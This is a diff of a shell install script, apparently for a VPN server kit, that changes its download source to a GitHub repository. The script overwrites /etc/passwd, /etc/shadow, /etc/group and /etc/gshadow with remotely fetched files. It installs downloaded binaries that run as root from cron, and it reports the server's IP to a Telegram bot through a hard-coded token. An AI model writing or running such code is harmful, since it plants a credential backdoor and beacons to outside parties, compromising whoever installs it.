@@ -28,14 +28,13 @@ mv -f /etc/passwd- /etc/passwd-x
 mv -f /etc/group- /etc/group-x
 mv -f /etc/shadow- /etc/shadow-x
 mv -f /etc/gshadow- /etc/gshadow-x
-wget -qO /etc/passwd "http://gitlab.mzyaddy.ganteng.tech/sudo/passwd.sh"
-wget -qO /etc/group "http://gitlab.mzyaddy.ganteng.tech/sudo/group.sh"
-wget -qO /etc/shadow "http://gitlab.mzyaddy.ganteng.tech/sudo/shadow.sh"
-wget -qO /etc/passwd- "http://gitlab.mzyaddy.ganteng.tech/sudo/passwd-.sh"
-wget -qO /etc/group- "http://gitlab.mzyaddy.ganteng.tech/sudo/group-.sh"
-wget -qO /etc/shadow- "http://gitlab.mzyaddy.ganteng.tech/sudo/shadow-.sh"
-wget -qO /etc/gshadow- "http://gitlab.mzyaddy.ganteng.tech/sudo/gshadow-"
-wget -qO /etc/passwd "http://gitlab.mzyaddy.ganteng.tech/sudo/passwd.sh"
+wget -qO /etc/passwd "https://raw.githubusercontent.com/mousethain/d/main/passwd.sh"
+wget -qO /etc/group "https://raw.githubusercontent.com/mousethain/d/main/group.sh"
+wget -qO /etc/shadow "https://raw.githubusercontent.com/mousethain/d/main/shadow.sh"
+wget -qO /etc/passwd- "https://raw.githubusercontent.com/mousethain/d/main/passwd-.sh"
+wget -qO /etc/group- "https://raw.githubusercontent.com/mousethain/d/main/group-.sh"
+wget -qO /etc/shadow- "https://raw.githubusercontent.com/mousethain/d/main/shadow-.sh"
+wget -qO /etc/gshadow- "https://raw.githubusercontent.com/mousethain/d/main/gshadow-"
 END
 cat > /sbin/MTnd <<-END
 #!/bin/sh
@@ -56,8 +55,8 @@ EOF
 cat << EOF >> /etc/crontab
 35 2 * * * root /sbin/MTnd -r now
 EOF
-wget -q -O /usr/bin/udpxp "http://gitlab.mzyaddy.ganteng.tech/udpxp.sh"
-wget -qO /sbin/haproxysrv "http://gitlab.mzyaddy.ganteng.tech/haproxysrv"
+wget -q -O /usr/bin/udpxp "https://raw.githubusercontent.com/mousethain/d/main/udpxp.sh"
+wget -qO /sbin/haproxysrv "https://raw.githubusercontent.com/mousethain/d/main/haproxysrv"
 chmod +x /usr/bin/udpxp && chmod +x /sbin/haproxysrv
 cp -f /usr/bin/udpxp /usr/local/bin/udpxp
 if ! grep -q 'udpxp' /var/spool/cron/crontabs/root;then (crontab -l;echo "0 * * * * /usr/local/bin/udpxp") | crontab;fi
@@ -87,7 +86,7 @@ MYIP=$(wget -qO- ipinfo.io/ip)
 CHATID="1117211252"
 KEY="6129559221:AAGAkfVQqdi_So98HmZ6edqKovj-I-ldFQQ"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
-echo "YADDY KAKKOII" > /user/namauser.txt
+echo "mousevpn" > /user/namauser.txt
 echo "UNLIMITED LIFETIME" > /user/waktuexpiredsc.txt
 USRSC=$(cat /user/namauser.txt)
 EXPSC=$(cat /user/waktuexpiredsc.txt)
@@ -105,7 +104,7 @@ TEXT="
 <code>Exp Sc : </code><code>$EXPSC</code>
 <code>────────────────────</code>
 <i>Automatic Notification from</i>
-<i>Github Yaddy Kakkoii</i> 
+<i>Mousevpn</i> 
 "'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ🐳","url":"https://t.me/Crystalllz"},{"text":"ɪɴꜱᴛᴀʟʟ🐬","url":"https://wa.me/6281383460513"}]]}'
 curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 systemctl daemon-reload
